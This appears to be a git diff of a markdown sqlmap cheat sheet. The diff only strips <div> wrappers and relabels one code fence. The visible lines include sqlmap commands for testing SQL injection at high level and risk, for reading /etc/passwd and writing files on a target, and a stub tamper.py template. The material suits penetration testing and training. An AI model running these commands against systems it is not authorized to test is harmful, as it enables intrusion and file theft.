@@ -6,18 +6,12 @@ tags: ["sqlmap", "sqli", "sql injection", "burpsuite"]
 
 ### sqlmap
 
-<div>
-
 ```console
 # In Burp Suite, we can right click the request and click `copy to file` to save the request
 # And add `*` to request to indicate the sql injection point
 ```
 
-</div>
-
 <br>
-
-<div>
 
 ```console
 # Initial testing HTTP
@@ -59,11 +53,7 @@ sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --thr
 sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --technique U
 ```
 
-</div>
-
 #### Technique
-
-<div>
 
 ```console
 +------------------------+
@@ -76,11 +66,7 @@ sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --thr
 +------------------------+
 ```
 
-</div>
-
 #### Advance sqlmap
-
-<div>
 
 ```console
 # File write
@@ -107,13 +93,9 @@ sqlmap -r request --file-read=/etc/passwd
 sqlmap -r request --file-write=./test.txt --file-dest=/tmp/test.txt
 ```
 
-</div>
-
 #### tamper.py template
 
-<div>
-
-```console
+```python
 #!/usr/bin/env python3
 
 from lib.core.enums import PRIORITY
@@ -126,8 +108,4 @@ def tamper(payload, **kwargs):
     return payload
 ```
 
-</div>
-
 <small>*Note: create an empty \_\_init\_\_.py in the same folder*</small>
-
-<br>
